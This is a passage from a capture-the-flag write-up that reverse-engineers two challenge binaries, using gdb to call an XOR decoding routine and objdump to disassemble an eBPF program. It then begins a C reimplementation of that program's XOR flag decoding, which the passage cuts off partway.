</span><span id=__span-6-50><a id=__codelineno-6-50 name=__codelineno-6-50 href=#__codelineno-6-50></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>basic_ostream</span><span class=o>&lt;&gt;::</span><span class=n>write</span><span class=p>(</span><span class=n>local_428</span><span class=p>,</span><span class=n>lVar2</span><span class=p>);</span>
</span><span id=__span-6-51><a id=__codelineno-6-51 name=__codelineno-6-51 href=#__codelineno-6-51></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>basic_ofstream</span><span class=o>&lt;&gt;::</span><span class=n>close</span><span class=p>();</span>
</span><span id=__span-6-52><a id=__codelineno-6-52 name=__codelineno-6-52 href=#__codelineno-6-52></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>basic_ofstream</span><span class=o>&lt;&gt;::~</span><span class=n>basic_ofstream</span><span class=p>(</span><span class=n>local_428</span><span class=p>);</span>
</span><span id=__span-6-53><a id=__codelineno-6-53 name=__codelineno-6-53 href=#__codelineno-6-53></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>vector</span><span class=o>&lt;&gt;::~</span><span class=n>vector</span><span class=p>(</span><span class=n>local_468</span><span class=p>);</span>
</span><span id=__span-6-54><a id=__codelineno-6-54 name=__codelineno-6-54 href=#__codelineno-6-54></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>basic_ifstream</span><span class=o>&lt;&gt;::~</span><span class=n>basic_ifstream</span><span class=p>(</span><span class=n>local_228</span><span class=p>);</span>
</span><span id=__span-6-55><a id=__codelineno-6-55 name=__codelineno-6-55 href=#__codelineno-6-55></a><span class=w>  </span><span class=n>std</span><span class=o>::</span><span class=n>__cxx11</span><span class=o>::</span><span class=n>basic_string</span><span class=o>&lt;&gt;::~</span><span class=n>basic_string</span><span class=p>(</span><span class=n>local_448</span><span class=p>);</span>
</span><span id=__span-6-56><a id=__codelineno-6-56 name=__codelineno-6-56 href=#__codelineno-6-56></a><span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>local_20</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=o>*</span><span class=p>(</span><span class=n>in_FS_OFFSET</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mh>0x28</span><span class=p>))</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-6-57><a id=__codelineno-6-57 name=__codelineno-6-57 href=#__codelineno-6-57></a><span class=w>                    </span><span class=cm>/* WARNING: Subroutine does not return */</span>
</span><span id=__span-6-58><a id=__codelineno-6-58 name=__codelineno-6-58 href=#__codelineno-6-58></a><span class=w>    </span><span class=n>__stack_chk_fail</span><span class=p>();</span>
</span><span id=__span-6-59><a id=__codelineno-6-59 name=__codelineno-6-59 href=#__codelineno-6-59></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-6-60><a id=__codelineno-6-60 name=__codelineno-6-60 href=#__codelineno-6-60></a><span class=w>  </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-6-61><a id=__codelineno-6-61 name=__codelineno-6-61 href=#__codelineno-6-61></a><span class=p>}</span>
</span></code></pre></div> <p>Looks like they are opening our encoded file and decoding it with xoring it with the two parameters. Note that no other characters of the buffer created matters. Nor does our key input matter. We should be able to call our function with setting our own parameters inside gdb.</p> <div class="language-sh highlight"><pre><span></span><code><span id=__span-7-1><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a>backdoor/rev/secret_door
</span><span id=__span-7-2><a id=__codelineno-7-2 name=__codelineno-7-2 href=#__codelineno-7-2></a>❯<span class=w> </span>la
</span><span id=__span-7-3><a id=__codelineno-7-3 name=__codelineno-7-3 href=#__codelineno-7-3></a>total<span class=w> </span>236K
</span><span id=__span-7-4><a id=__codelineno-7-4 name=__codelineno-7-4 href=#__codelineno-7-4></a>-rwxrwxr-x<span class=w> </span><span class=m>1</span><span class=w> </span>groot<span class=w> </span>groot<span class=w>  </span>44K<span class=w> </span>Dec<span class=w> </span><span class=m>12</span><span class=w> </span><span class=m>11</span>:31<span class=w> </span>chall.out*
</span><span id=__span-7-5><a id=__codelineno-7-5 name=__codelineno-7-5 href=#__codelineno-7-5></a>-rw-rw-r--<span class=w> </span><span class=m>1</span><span class=w> </span>groot<span class=w> </span>groot<span class=w>  </span>89K<span class=w> </span>Dec<span class=w> </span><span class=m>12</span><span class=w> </span><span class=m>11</span>:31<span class=w> </span>encoded.bin
</span><span id=__span-7-6><a id=__codelineno-7-6 name=__codelineno-7-6 href=#__codelineno-7-6></a>-rw-r--r--<span class=w> </span><span class=m>1</span><span class=w> </span>groot<span class=w> </span>groot<span class=w>  </span>94K<span class=w> </span>Dec<span class=w> </span><span class=m>16</span><span class=w> </span><span class=m>18</span>:04<span class=w> </span>public.zip
</span><span id=__span-7-7><a id=__codelineno-7-7 name=__codelineno-7-7 href=#__codelineno-7-7></a>
</span><span id=__span-7-8><a id=__codelineno-7-8 name=__codelineno-7-8 href=#__codelineno-7-8></a>backdoor/rev/secret_door
</span><span id=__span-7-9><a id=__codelineno-7-9 name=__codelineno-7-9 href=#__codelineno-7-9></a>❯<span class=w> </span>gdb<span class=w> </span>chall.out
</span><span id=__span-7-10><a id=__codelineno-7-10 name=__codelineno-7-10 href=#__codelineno-7-10></a>gef➤<span class=w>  </span>start
</span><span id=__span-7-11><a id=__codelineno-7-11 name=__codelineno-7-11 href=#__codelineno-7-11></a>gef➤<span class=w>  </span>call<span class=w> </span><span class=o>(</span>void<span class=o>)</span>func_1<span class=o>(</span>0x4e,<span class=w> </span>0x21<span class=o>)</span>
</span><span id=__span-7-12><a id=__codelineno-7-12 name=__codelineno-7-12 href=#__codelineno-7-12></a>gef➤<span class=w>  </span>q
</span><span id=__span-7-13><a id=__codelineno-7-13 name=__codelineno-7-13 href=#__codelineno-7-13></a>
</span><span id=__span-7-14><a id=__codelineno-7-14 name=__codelineno-7-14 href=#__codelineno-7-14></a>backdoor/rev/secret_door<span class=w> </span>took<span class=w> </span>31s
</span><span id=__span-7-15><a id=__codelineno-7-15 name=__codelineno-7-15 href=#__codelineno-7-15></a>❯<span class=w> </span>la
</span><span id=__span-7-16><a id=__codelineno-7-16 name=__codelineno-7-16 href=#__codelineno-7-16></a>total<span class=w> </span>328K
</span><span id=__span-7-17><a id=__codelineno-7-17 name=__codelineno-7-17 href=#__codelineno-7-17></a>-rwxrwxr-x<span class=w> </span><span class=m>1</span><span class=w> </span>groot<span class=w> </span>groot<span class=w>  </span>44K<span class=w> </span>Dec<span class=w> </span><span class=m>12</span><span class=w> </span><span class=m>11</span>:31<span class=w> </span>chall.out*
</span><span id=__span-7-18><a id=__codelineno-7-18 name=__codelineno-7-18 href=#__codelineno-7-18></a>-rw-rw-r--<span class=w> </span><span class=m>1</span><span class=w> </span>groot<span class=w> </span>groot<span class=w>  </span>89K<span class=w> </span>Dec<span class=w> </span><span class=m>12</span><span class=w> </span><span class=m>11</span>:31<span class=w> </span>encoded.bin
</span><span id=__span-7-19><a id=__codelineno-7-19 name=__codelineno-7-19 href=#__codelineno-7-19></a>-rw-r--r--<span class=w> </span><span class=m>1</span><span class=w> </span>groot<span class=w> </span>groot<span class=w>  </span>94K<span class=w> </span>Dec<span class=w> </span><span class=m>16</span><span class=w> </span><span class=m>18</span>:04<span class=w> </span>public.zip
</span><span id=__span-7-20><a id=__codelineno-7-20 name=__codelineno-7-20 href=#__codelineno-7-20></a>-rw-r--r--<span class=w> </span><span class=m>1</span><span class=w> </span>groot<span class=w> </span>groot<span class=w>  </span>89K<span class=w> </span>Dec<span class=w> </span><span class=m>25</span><span class=w> </span><span class=m>20</span>:41<span class=w> </span>the_door.jpg
</span></code></pre></div> <p>The door looks like this:</p> <p><a class=glightbox href=rev/secret_door/the_door.jpg data-type=image data-width=100% data-height=auto data-title=secret_door data-desc-position=bottom><img alt=secret_door src=rev/secret_door/the_door.jpg></a></p> <p>flag: <code>flag{0p3n3d_7h3_s3cr3t_r3d_d00r}</code></p> <hr> <h2 id=baby-ebpf>Baby-ebpf<a class=headerlink href=#baby-ebpf title="Permanent link">&para;</a></h2> <p>We were given a <a href=https://en.wikipedia.org/wiki/EBPF>ebpf</a> elf <a href=rev/babyebpf/babyebpf.o>file</a>. The intended solve for this was to load this ebpf and look at the kernel trace. But I just old-school reversed it with objdump.</p> <div class="language-sh highlight"><pre><span></span><code><span id=__span-8-1><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a>backdoor/rev/babyebpf<span class=w> </span>on<span class=w> </span><span class=w> </span>master<span class=w> </span><span class=o>[</span>!?<span class=o>]</span>
</span><span id=__span-8-2><a id=__codelineno-8-2 name=__codelineno-8-2 href=#__codelineno-8-2></a>❯<span class=w> </span>objdump<span class=w> </span>-d<span class=w> </span>babyebpf.o
</span><span id=__span-8-3><a id=__codelineno-8-3 name=__codelineno-8-3 href=#__codelineno-8-3></a>
</span><span id=__span-8-4><a id=__codelineno-8-4 name=__codelineno-8-4 href=#__codelineno-8-4></a>babyebpf.o:<span class=w>     </span>file<span class=w> </span>format<span class=w> </span>elf64-bpfle
</span><span id=__span-8-5><a id=__codelineno-8-5 name=__codelineno-8-5 href=#__codelineno-8-5></a>
</span><span id=__span-8-6><a id=__codelineno-8-6 name=__codelineno-8-6 href=#__codelineno-8-6></a>
</span><span id=__span-8-7><a id=__codelineno-8-7 name=__codelineno-8-7 href=#__codelineno-8-7></a>Disassembly<span class=w> </span>of<span class=w> </span>section<span class=w> </span>tp/syscalls/sys_enter_execve:
</span><span id=__span-8-8><a id=__codelineno-8-8 name=__codelineno-8-8 href=#__codelineno-8-8></a>
</span><span id=__span-8-9><a id=__codelineno-8-9 name=__codelineno-8-9 href=#__codelineno-8-9></a><span class=m>0000000000000000</span><span class=w> </span>&lt;detect_execve&gt;:
</span><span id=__span-8-10><a id=__codelineno-8-10 name=__codelineno-8-10 href=#__codelineno-8-10></a><span class=w>   </span><span class=m>0</span>:<span class=w>   </span>b7<span class=w> </span><span class=m>01</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>44</span><span class=w> </span><span class=m>04</span><span class=w> </span><span class=m>05</span><span class=w> </span>1c<span class=w>         </span>mov<span class=w> </span>%r1,0x1c050444
</span><span id=__span-8-11><a id=__codelineno-8-11 name=__codelineno-8-11 href=#__codelineno-8-11></a><span class=w>   </span><span class=m>8</span>:<span class=w>   </span><span class=m>63</span><span class=w> </span>1a<span class=w> </span>f8<span class=w> </span>ff<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>stxw<span class=w> </span><span class=o>[</span>%fp+-8<span class=o>]</span>,%r1
</span><span id=__span-8-12><a id=__codelineno-8-12 name=__codelineno-8-12 href=#__codelineno-8-12></a><span class=w>  </span><span class=m>10</span>:<span class=w>   </span><span class=m>18</span><span class=w> </span><span class=m>01</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>19</span><span class=w> </span><span class=m>08</span><span class=w> </span><span class=m>34</span><span class=w> </span><span class=m>01</span><span class=w>         </span>lddw<span class=w> </span>%r1,0x954094701340819
</span><span id=__span-8-13><a id=__codelineno-8-13 name=__codelineno-8-13 href=#__codelineno-8-13></a><span class=w>  </span><span class=m>18</span>:<span class=w>   </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>47</span><span class=w> </span><span class=m>09</span><span class=w> </span><span class=m>54</span><span class=w> </span><span class=m>09</span>
</span><span id=__span-8-14><a id=__codelineno-8-14 name=__codelineno-8-14 href=#__codelineno-8-14></a><span class=w>  </span><span class=m>20</span>:<span class=w>   </span>7b<span class=w> </span>1a<span class=w> </span>f0<span class=w> </span>ff<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>stxdw<span class=w> </span><span class=o>[</span>%fp+-16<span class=o>]</span>,%r1
</span><span id=__span-8-15><a id=__codelineno-8-15 name=__codelineno-8-15 href=#__codelineno-8-15></a><span class=w>  </span><span class=m>28</span>:<span class=w>   </span><span class=m>18</span><span class=w> </span><span class=m>01</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>13</span><span class=w> </span><span class=m>57</span><span class=w> </span>3e<span class=w> </span><span class=m>40</span><span class=w>         </span>lddw<span class=w> </span>%r1,0x10523251403e5713
</span><span id=__span-8-16><a id=__codelineno-8-16 name=__codelineno-8-16 href=#__codelineno-8-16></a><span class=w>  </span><span class=m>30</span>:<span class=w>   </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>51</span><span class=w> </span><span class=m>32</span><span class=w> </span><span class=m>52</span><span class=w> </span><span class=m>10</span>
</span><span id=__span-8-17><a id=__codelineno-8-17 name=__codelineno-8-17 href=#__codelineno-8-17></a><span class=w>  </span><span class=m>38</span>:<span class=w>   </span>7b<span class=w> </span>1a<span class=w> </span>e8<span class=w> </span>ff<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>stxdw<span class=w> </span><span class=o>[</span>%fp+-24<span class=o>]</span>,%r1
</span><span id=__span-8-18><a id=__codelineno-8-18 name=__codelineno-8-18 href=#__codelineno-8-18></a><span class=w>  </span><span class=m>40</span>:<span class=w>   </span><span class=m>18</span><span class=w> </span><span class=m>01</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>0b<span class=w> </span>0d<span class=w> </span><span class=m>13</span><span class=w> </span>0e<span class=w>         </span>lddw<span class=w> </span>%r1,0x43075a150e130d0b
</span><span id=__span-8-19><a id=__codelineno-8-19 name=__codelineno-8-19 href=#__codelineno-8-19></a><span class=w>  </span><span class=m>48</span>:<span class=w>   </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>15</span><span class=w> </span>5a<span class=w> </span><span class=m>07</span><span class=w> </span><span class=m>43</span>
</span><span id=__span-8-20><a id=__codelineno-8-20 name=__codelineno-8-20 href=#__codelineno-8-20></a><span class=w>  </span><span class=m>50</span>:<span class=w>   </span>7b<span class=w> </span>1a<span class=w> </span>e0<span class=w> </span>ff<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>stxdw<span class=w> </span><span class=o>[</span>%fp+-32<span class=o>]</span>,%r1
</span><span id=__span-8-21><a id=__codelineno-8-21 name=__codelineno-8-21 href=#__codelineno-8-21></a><span class=w>  </span><span class=m>58</span>:<span class=w>   </span>b7<span class=w> </span><span class=m>01</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>mov<span class=w> </span>%r1,0
</span><span id=__span-8-22><a id=__codelineno-8-22 name=__codelineno-8-22 href=#__codelineno-8-22></a>
</span><span id=__span-8-23><a id=__codelineno-8-23 name=__codelineno-8-23 href=#__codelineno-8-23></a><span class=m>0000000000000060</span><span class=w> </span>&lt;LBB0_1&gt;:
</span><span id=__span-8-24><a id=__codelineno-8-24 name=__codelineno-8-24 href=#__codelineno-8-24></a><span class=w>  </span><span class=m>60</span>:<span class=w>   </span><span class=m>18</span><span class=w> </span><span class=m>02</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>lddw<span class=w> </span>%r2,0
</span><span id=__span-8-25><a id=__codelineno-8-25 name=__codelineno-8-25 href=#__codelineno-8-25></a><span class=w>  </span><span class=m>68</span>:<span class=w>   </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span>
</span><span id=__span-8-26><a id=__codelineno-8-26 name=__codelineno-8-26 href=#__codelineno-8-26></a><span class=w>  </span><span class=m>70</span>:<span class=w>   </span>0f<span class=w> </span><span class=m>12</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>add<span class=w> </span>%r2,%r1
</span><span id=__span-8-27><a id=__codelineno-8-27 name=__codelineno-8-27 href=#__codelineno-8-27></a><span class=w>  </span><span class=m>78</span>:<span class=w>   </span><span class=m>71</span><span class=w> </span><span class=m>22</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>ldxb<span class=w> </span>%r2,<span class=o>[</span>%r2+0<span class=o>]</span>
</span><span id=__span-8-28><a id=__codelineno-8-28 name=__codelineno-8-28 href=#__codelineno-8-28></a><span class=w>  </span><span class=m>80</span>:<span class=w>   </span>bf<span class=w> </span>a3<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>mov<span class=w> </span>%r3,%fp
</span><span id=__span-8-29><a id=__codelineno-8-29 name=__codelineno-8-29 href=#__codelineno-8-29></a><span class=w>  </span><span class=m>88</span>:<span class=w>   </span><span class=m>07</span><span class=w> </span><span class=m>03</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>e0<span class=w> </span>ff<span class=w> </span>ff<span class=w> </span>ff<span class=w>         </span>add<span class=w> </span>%r3,-32
</span><span id=__span-8-30><a id=__codelineno-8-30 name=__codelineno-8-30 href=#__codelineno-8-30></a><span class=w>  </span><span class=m>90</span>:<span class=w>   </span>0f<span class=w> </span><span class=m>13</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>add<span class=w> </span>%r3,%r1
</span><span id=__span-8-31><a id=__codelineno-8-31 name=__codelineno-8-31 href=#__codelineno-8-31></a><span class=w>  </span><span class=m>98</span>:<span class=w>   </span><span class=m>71</span><span class=w> </span><span class=m>34</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>ldxb<span class=w> </span>%r4,<span class=o>[</span>%r3+0<span class=o>]</span>
</span><span id=__span-8-32><a id=__codelineno-8-32 name=__codelineno-8-32 href=#__codelineno-8-32></a><span class=w>  </span>a0:<span class=w>   </span>af<span class=w> </span><span class=m>42</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>xor<span class=w> </span>%r2,%r4
</span><span id=__span-8-33><a id=__codelineno-8-33 name=__codelineno-8-33 href=#__codelineno-8-33></a><span class=w>  </span>a8:<span class=w>   </span><span class=m>73</span><span class=w> </span><span class=m>23</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>stxb<span class=w> </span><span class=o>[</span>%r3+0<span class=o>]</span>,%r2
</span><span id=__span-8-34><a id=__codelineno-8-34 name=__codelineno-8-34 href=#__codelineno-8-34></a><span class=w>  </span>b0:<span class=w>   </span><span class=m>07</span><span class=w> </span><span class=m>01</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>01</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>add<span class=w> </span>%r1,1
</span><span id=__span-8-35><a id=__codelineno-8-35 name=__codelineno-8-35 href=#__codelineno-8-35></a><span class=w>  </span>b8:<span class=w>   </span><span class=m>15</span><span class=w> </span><span class=m>01</span><span class=w> </span><span class=m>01</span><span class=w> </span><span class=m>00</span><span class=w> </span>1c<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>jeq<span class=w> </span>%r1,0x1c,1
</span><span id=__span-8-36><a id=__codelineno-8-36 name=__codelineno-8-36 href=#__codelineno-8-36></a><span class=w>  </span>c0:<span class=w>   </span><span class=m>05</span><span class=w> </span><span class=m>00</span><span class=w> </span>f3<span class=w> </span>ff<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>ja<span class=w> </span>-13
</span><span id=__span-8-37><a id=__codelineno-8-37 name=__codelineno-8-37 href=#__codelineno-8-37></a>
</span><span id=__span-8-38><a id=__codelineno-8-38 name=__codelineno-8-38 href=#__codelineno-8-38></a>00000000000000c8<span class=w> </span>&lt;LBB0_2&gt;:
</span><span id=__span-8-39><a id=__codelineno-8-39 name=__codelineno-8-39 href=#__codelineno-8-39></a><span class=w>  </span>c8:<span class=w>   </span>bf<span class=w> </span>a3<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>mov<span class=w> </span>%r3,%fp
</span><span id=__span-8-40><a id=__codelineno-8-40 name=__codelineno-8-40 href=#__codelineno-8-40></a><span class=w>  </span>d0:<span class=w>   </span><span class=m>07</span><span class=w> </span><span class=m>03</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>e0<span class=w> </span>ff<span class=w> </span>ff<span class=w> </span>ff<span class=w>         </span>add<span class=w> </span>%r3,-32
</span><span id=__span-8-41><a id=__codelineno-8-41 name=__codelineno-8-41 href=#__codelineno-8-41></a><span class=w>  </span>d8:<span class=w>   </span><span class=m>18</span><span class=w> </span><span class=m>01</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span>1c<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>lddw<span class=w> </span>%r1,0x1c
</span><span id=__span-8-42><a id=__codelineno-8-42 name=__codelineno-8-42 href=#__codelineno-8-42></a><span class=w>  </span>e0:<span class=w>   </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span>
</span><span id=__span-8-43><a id=__codelineno-8-43 name=__codelineno-8-43 href=#__codelineno-8-43></a><span class=w>  </span>e8:<span class=w>   </span>b7<span class=w> </span><span class=m>02</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>04</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>mov<span class=w> </span>%r2,4
</span><span id=__span-8-44><a id=__codelineno-8-44 name=__codelineno-8-44 href=#__codelineno-8-44></a><span class=w>  </span>f0:<span class=w>   </span><span class=m>85</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>06</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>call<span class=w> </span><span class=m>6</span>
</span><span id=__span-8-45><a id=__codelineno-8-45 name=__codelineno-8-45 href=#__codelineno-8-45></a><span class=w>  </span>f8:<span class=w>   </span>b7<span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>01</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span>mov<span class=w> </span>%r0,1
</span><span id=__span-8-46><a id=__codelineno-8-46 name=__codelineno-8-46 href=#__codelineno-8-46></a><span class=w> </span><span class=m>100</span>:<span class=w>   </span><span class=m>95</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w> </span><span class=m>00</span><span class=w>         </span><span class=nb>exit</span>
</span></code></pre></div> <p>The <code>detect_execve</code> function saves some constant values in the memory. <code>LBB0_1</code> function uses some memory string as reference as the key for xoring and <code>LBB0_2</code> function was used to print the flag out in the kernel trace. I rewrote the algorithm in c.</p> <div class="language-c highlight"><pre><span></span><code><span id=__span-9-1><a id=__codelineno-9-1 name=__codelineno-9-1 href=#__codelineno-9-1></a><span class=cp>#include</span><span class=w> </span><span class=cpf>&lt;stdio.h&gt;</span>
</span><span id=__span-9-2><a id=__codelineno-9-2 name=__codelineno-9-2 href=#__codelineno-9-2></a>
</span><span id=__span-9-3><a id=__codelineno-9-3 name=__codelineno-9-3 href=#__codelineno-9-3></a><span class=kt>int</span><span class=w> </span><span class=nf>main</span><span class=p>()</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-9-4><a id=__codelineno-9-4 name=__codelineno-9-4 href=#__codelineno-9-4></a><span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>key</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&quot;marinkitagawamarinkitagawama</span><span class=se>\0</span><span class=s>&quot;</span><span class=p>;</span>
</span><span id=__span-9-5><a id=__codelineno-9-5 name=__codelineno-9-5 href=#__codelineno-9-5></a><span class=w>  </span><span class=kt>char</span><span class=w> </span><span class=n>arr</span><span class=p>[]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span><span class=mh>0x0b</span><span class=p>,</span><span class=w> </span><span class=mh>0x0d</span><span class=p>,</span><span class=w> </span><span class=mh>0x13</span><span class=p>,</span><span class=w> </span><span class=mh>0x0e</span><span class=p>,</span><span class=w> </span><span class=mh>0x15</span><span class=p>,</span><span class=w> </span><span class=mh>0x5a</span><span class=p>,</span><span class=w> </span><span class=mh>0x07</span><span class=p>,</span><span class=w> </span><span class=mh>0x43</span><span class=p>,</span><span class=w> </span><span class=mh>0x13</span><span class=p>,</span><span class=w> </span><span class=mh>0x57</span><span class=p>,</span>
</span><span id=__span-9-6><a id=__codelineno-9-6 name=__codelineno-9-6 href=#__codelineno-9-6></a><span class=w>                </span><span class=mh>0x3e</span><span class=p>,</span><span class=w> </span><span class=mh>0x40</span><span class=p>,</span><span class=w> </span><span class=mh>0x51</span><span class=p>,</span><span class=w> </span><span class=mh>0x32</span><span class=p>,</span><span class=w> </span><span class=mh>0x52</span><span class=p>,</span><span class=w> </span><span class=mh>0x10</span><span class=p>,</span><span class=w> </span><span class=mh>0x19</span><span class=p>,</span><span class=w> </span><span class=mh>0x08</span><span class=p>,</span><span class=w> </span><span class=mh>0x34</span><span class=p>,</span><span class=w> </span><span class=mh>0x01</span><span class=p>,</span>
</span><span id=__span-9-7><a id=__codelineno-9-7 name=__codelineno-9-7 href=#__codelineno-9-7></a><span class=w>                </span><span class=mh>0x47</span><span class=p>,</span><span class=w> </span><span class=mh>0x09</span><span class=p>,</span><span class=w> </span><span class=mh>0x54</span><span class=p>,</span><span class=w> </span><span class=mh>0x09</span><span class=p>,</span><span class=w> </span><span class=mh>0x44</span><span class=p>,</span><span class=w> </span><span class=mh>0x04</span><span class=p>,</span><span class=w> </span><span class=mh>0x05</span><span class=p>,</span><span class=w> </span><span class=mh>0x1c</span><span class=p>};</span>
</span><span id=__span-9-8><a id=__codelineno-9-8 name=__codelineno-9-8 href=#__codelineno-9-8></a><span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>arr</span><span class=p>)</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>arr</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span><span id=__span-9-9><a id=__codelineno-9-9 name=__codelineno-9-9 href=#__codelineno-9-9></a><span class=w>  </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>len</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
